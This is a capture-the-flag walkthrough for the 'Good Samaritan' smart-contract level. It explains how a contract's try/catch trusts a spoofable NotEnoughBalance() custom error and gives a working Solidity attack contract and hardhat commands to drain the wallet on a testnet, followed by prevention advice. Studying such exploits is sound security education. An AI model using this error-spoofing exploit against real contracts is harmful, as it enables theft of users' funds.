# Level 27: Good Samaritan Challenge

## Challenge Description

This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.

Would you be able to drain all the balance from his Wallet?

**Things that might help:**
- Solidity Custom Errors

## Contract Location

The challenge contracts are located at:
```
/contracts/level-27-good-samaritan/GoodSamaritan.sol
```

## Understanding the Challenge

This level involves THREE contracts that work together:

### 1. GoodSamaritan

```solidity
contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}
```

The GoodSamaritan contract:
- Tries to donate 10 coins via `wallet.donate10()`
- If it catches a `NotEnoughBalance()` error, it assumes the wallet doesn't have enough coins
- In that case, it calls `wallet.transferRemainder()` to send ALL remaining coins
- This is the vulnerability we'll exploit!

### 2. Wallet

```solidity
contract Wallet {
    address public owner;
    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }
}
```

The Wallet contract:
- Has a custom error `NotEnoughBalance()` 
- `donate10()` checks if balance >= 10, reverts with `NotEnoughBalance()` if not
- `transferRemainder()` sends the entire balance to the recipient
- Both functions call `coin.transfer()`

### 3. Coin

```solidity
contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

The Coin contract:
- Holds balances for addresses
- Starts with 1,000,000 coins in the wallet
- After transferring coins, it calls `notify()` on contract recipients
- This callback is the key to our exploit!

## The Vulnerability

The vulnerability lies in the **error handling logic combined with the notification callback**:

### The Flawed Logic Flow:

```
Normal Flow (when wallet has >= 10 coins):
1. User calls requestDonation()
2. GoodSamaritan calls wallet.donate10(user)
3. Wallet transfers 10 coins
4. Coin.transfer() calls user.notify(10)
5. User receives 10 coins ✓

Exploited Flow (our attack):
1. Attacker contract calls requestDonation()
2. GoodSamaritan calls wallet.donate10(attacker)
3. Wallet transfers 10 coins
4. Coin.transfer() calls attacker.notify(10)
5. Attacker.notify() checks: amount == 10? YES!
6. Attacker.notify() reverts with NotEnoughBalance()
7. GoodSamaritan catches NotEnoughBalance() error
8. GoodSamaritan thinks: "Wallet must be empty!"
9. GoodSamaritan calls wallet.transferRemainder(attacker)
10. Wallet transfers ALL 1,000,000 coins
11. Coin.transfer() calls attacker.notify(1000000)
12. Attacker.notify() checks: amount == 10? NO!
13. Attacker.notify() returns normally (no revert)
14. Attacker receives all 1,000,000 coins! 💰
```

### Why This Works

The key insights:

1. **Custom Error Manipulation**: We can fake the `NotEnoughBalance()` error in our contract
2. **Error Source Not Validated**: GoodSamaritan doesn't verify WHERE the error came from
3. **Callback Control**: We control the `notify()` callback and can selectively revert
4. **Conditional Logic**: We revert only when amount == 10 (initial donation attempt)
5. **Second Transfer**: When the full amount is sent, we let it succeed

## The Solution: Attack Contract

We create an attack contract that implements `INotifyable` and manipulates the error:

### Attack Contract Implementation

```solidity
contract GoodSamaritanAttack {
    error NotEnoughBalance();  // Match the Wallet's error signature
    
    IGoodSamaritan public goodSamaritan;
    
    constructor(address _goodSamaritan) {
        goodSamaritan = IGoodSamaritan(_goodSamaritan);
    }
    
    function notify(uint256 amount) external pure {
        // If receiving initial 10 coins donation, fake the error
        if (amount == 10) {
            revert NotEnoughBalance();
        }
        // Otherwise, let the transfer succeed (we're getting all coins!)
    }
    
    function attack() external {
        goodSamaritan.requestDonation();
    }
}
```

### How It Works

1. **Error Signature Matching**: We define the exact same `NotEnoughBalance()` error
   - Custom errors are identified by their 4-byte selector
   - Our error will have the same selector as Wallet's error
   
2. **Selective Reverting**: In `notify()`:
   - If `amount == 10`: This is the initial donation attempt → REVERT with fake error
   - If `amount != 10`: This is the full transfer → LET IT SUCCEED

3. **Triggering the Exploit**: Call `attack()` which:
   - Calls `goodSamaritan.requestDonation()`
   - Triggers the donation attempt
   - Our fake error tricks the error handling
   - We receive all the coins!

## Key Concepts

### 1. Solidity Custom Errors

Custom errors (introduced in Solidity 0.8.4) are more gas-efficient than error strings:

```solidity
// Old way (expensive)
require(balance >= amount, "Not enough balance");

// New way (cheaper)
error NotEnoughBalance();
if (balance < amount) revert NotEnoughBalance();
```

**Error Identification:**
- Errors are identified by their 4-byte selector
- Selector = first 4 bytes of `keccak256("ErrorName()")`
- Two errors with the same name have the same selector
- This allows us to fake errors from other contracts!

### 2. Try-Catch Error Handling

The vulnerability exploits Solidity's try-catch mechanism:

```solidity
try externalCall() {
    // Success path
} catch (bytes memory err) {
    // Error path - we can check error type
    if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
        // Handle specific error
    }
}
```

**The Flaw:**
- The catch block doesn't verify WHERE the error came from
- It only checks the error signature
- An attacker can fake the error in a callback!

### 3. Callback Reentrancy Pattern

The `notify()` callback creates a reentrancy-like pattern:

```solidity
function transfer(address dest_, uint256 amount_) external {
    // ... transfer logic ...
    
    if (dest_.isContract()) {
        INotifyable(dest_).notify(amount_);  // External call to untrusted code
    }
}
```

**Risks:**
- The recipient controls the callback logic
- They can revert selectively
- They can manipulate the control flow
- They can fake error conditions

### 4. Control Flow Manipulation

Our attack manipulates control flow through selective reverts:

```
Amount = 10 → Revert → Trigger error handling → Get full transfer
Amount = 1,000,000 → Success → Keep all coins
```

This is similar to:
- Reentrancy attacks (manipulating execution flow)
- Check-effects-interactions violations
- Callback exploitation

## Step-by-Step Solution

### Step 1: Deploy the Instance Contract

```bash
npx hardhat deploy --tags level-27 --network sepolia
```

This deploys:
- GoodSamaritan contract
- Wallet contract (created by GoodSamaritan)
- Coin contract (created by GoodSamaritan)

### Step 2: Deploy the Attack Contract

```bash
GOOD_SAMARITAN_ADDRESS=0xYourGoodSamaritanAddress \
  npx hardhat deploy --tags good-samaritan-solution --network sepolia
```

Or deploy both together:
```bash
npx hardhat deploy --tags level-27 --network sepolia
```

### Step 3: Execute the Attack

```bash
ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress \
  npx hardhat run scripts/level-27-good-samaritan/attack.ts --network sepolia
```

Expected result: All 1,000,000 coins drained from the wallet!

## Security Lessons

1. **Never Trust Callback Data**: When catching errors from callbacks, verify the source
   - Check that the error came from the expected contract
   - Don't make critical decisions based solely on error signatures

2. **Validate Error Sources**: Custom errors can be faked by any contract
   - Error signatures alone don't prove authenticity
   - Validate the call stack or use other verification methods

3. **Avoid Control Flow Based on External Errors**: Don't use try-catch for critical logic
   - External contracts can manipulate errors
   - Use explicit state checks instead
   - Verify conditions directly rather than inferring from errors

4. **Be Careful with Callbacks to Untrusted Contracts**:
   - They can revert selectively
   - They can reenter your contract
   - They can fake errors or return malicious data

5. **Check-Effects-Interactions Pattern**:
   - Update state before external calls
   - Don't make decisions after external calls
   - External calls should be the last action

## Common Pitfalls

1. **Not Implementing notify()**: Forgetting to implement `INotifyable` interface
2. **Wrong Error Signature**: Using a different error name (must match exactly)
3. **Reverting on Wrong Amount**: Reverting when amount != 10 instead of amount == 10
4. **Not Handling Second Transfer**: Reverting on both transfers instead of just the first

## Prevention in Real Contracts

To prevent this vulnerability:

1. **Don't Use Error Handling for Control Flow**:
```solidity
// BAD: Using error catching for logic
try wallet.donate10(msg.sender) {
    return true;
} catch (bytes memory err) {
    wallet.transferRemainder(msg.sender);  // Dangerous!
}

// GOOD: Check state explicitly
if (wallet.balance() >= 10) {
    wallet.donate10(msg.sender);
} else {
    wallet.transferRemainder(msg.sender);
}
```

2. **Validate Callback Results**:
```solidity
// GOOD: Validate callback behavior
if (dest_.isContract()) {
    try INotifyable(dest_).notify(amount_) {
        // Success
    } catch {
        // Handle failure - but don't change logic!
        emit NotificationFailed(dest_);
    }
}
```

3. **Use Access Controls**:
```solidity
// Restrict who can receive full balance transfers
mapping(address => bool) public trustedRecipients;

function transferRemainder(address dest_) external onlyOwner {
    require(trustedRecipients[dest_], "Not trusted");
    coin.transfer(dest_, coin.balances(address(this)));
}
```

4. **Implement Rate Limiting**:
```solidity
mapping(address => uint256) public lastDonationTime;
uint256 public constant COOLDOWN = 1 days;

function requestDonation() external {
    require(block.timestamp >= lastDonationTime[msg.sender] + COOLDOWN, "Cooldown");
    lastDonationTime[msg.sender] = block.timestamp;
    // ... donation logic ...
}
```

## Advanced Concepts

### Error Selector Calculation

Custom errors are identified by their selector:

```solidity
error NotEnoughBalance();

// Selector calculation:
bytes4 selector = bytes4(keccak256("NotEnoughBalance()"));
// selector = 0xad3a8b9e
```

When two contracts define the same error name, they have identical selectors!

### ABI Encoding of Errors

Error data is ABI-encoded:

```
Error with no parameters: NotEnoughBalance()
Encoded: 0xad3a8b9e (just the 4-byte selector)

Error with parameters: InsufficientBalance(uint256 current, uint256 required)
Encoded: 0x<selector><current><required>
```

The GoodSamaritan compares the full encoded error:
```solidity
if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err))
```

Our fake error has the same encoding, so it passes the check!

### Gas Efficiency of Custom Errors

Custom errors save gas compared to require strings:

```solidity
// Expensive: ~50 gas per character
require(amount <= balance, "Insufficient balance");

// Cheap: ~22 gas
error InsufficientBalance(uint256 available, uint256 required);
if (amount > balance) revert InsufficientBalance(balance, amount);
```

But this gas efficiency comes with a security trade-off if not used carefully!

## References

- [Solidity Custom Errors](https://docs.soliditylang.org/en/latest/contracts.html#errors)
- [Try-Catch in Solidity](https://docs.soliditylang.org/en/latest/control-structures.html#try-catch)
- [Checks-Effects-Interactions Pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html)
- [EIP-838: ABI Specification for Errors](https://github.com/ethereum/EIPs/issues/838)

## Deployment

Deploy the challenge contracts:
```bash
npx hardhat deploy --tags level-27 --network sepolia
```

Deploy the attack contract:
```bash
GOOD_SAMARITAN_ADDRESS=0xAddress \
  npx hardhat deploy --tags good-samaritan-solution --network sepolia
```

Execute the attack:
```bash
ATTACK_CONTRACT_ADDRESS=0xAddress \
  npx hardhat run scripts/level-27-good-samaritan/attack.ts --network sepolia
```

## Summary

The Good Samaritan level teaches us about:
- ✅ Custom error manipulation
- ✅ Error handling vulnerabilities  
- ✅ Callback exploitation
- ✅ Control flow manipulation
- ✅ The importance of validating error sources

The key takeaway: **Never trust errors from external contracts, especially in callbacks!** Always validate the source and context of errors before making critical decisions based on them.
